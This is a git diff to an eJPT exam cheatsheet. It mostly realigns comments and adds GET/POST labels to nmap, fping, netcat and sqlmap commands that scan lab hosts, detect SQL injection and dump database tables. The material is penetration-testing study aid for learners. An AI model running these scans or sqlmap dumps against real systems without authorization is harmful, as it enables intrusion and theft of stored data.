@@ -3,14 +3,14 @@ This is a Cheatsheet for eJPT Exam & Course.
 
 ## Nmap
 ```sh
-nmap -sn 10.10.10.0/24                              #Host Discover
+nmap -sn 10.10.10.0/24                             #Host Discover
 nmap -sV -p- -iL 10.10.10.10 -oN nmap.initial 
 nmap -A -p- -iL 10.10.10.10 -oN nmap.aggressive 
-nmap -p<port> --script=vuln 10.10.10.10           #Vulnerabillity Assessment
+nmap -p<port> --script=vuln 10.10.10.10            #Vulnerabillity Assessment
 ```
 ## fPing
 ```sh
-fping -a -g 10.10.10.0/24 2>/dev/null            #Host Discover
+fping -a -g 10.10.10.0/24 2>/dev/null              #Host Discover
 ``` 
 ## IP Route
 **Syntax**\
@@ -76,26 +76,26 @@ nc -nv 10.10.10.10 \<port\>
 #### Check if injection exists
 ```sh
 sqlmap -r Post.req
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id          #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"      #POST Method
 ```
 #### Get database if injection Exists
 ```sh
 sqlmap -r login.req --dbs
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs    #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs #POST Method
 ```
 #### Get Tables in a Database
 ```sh
-sqlmap -r login.req -D dbname --tables
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables
+sqlmap -r login.req -D dbname --tables 
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables        #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables #POST Method
 ```
 #### Get data in a Database tables
 ```sh
 sqlmap -r login.req -D dbname -T table_name --dump
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump      #GET Method
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump   #POST Method
 ```
 ## MYSQL
 
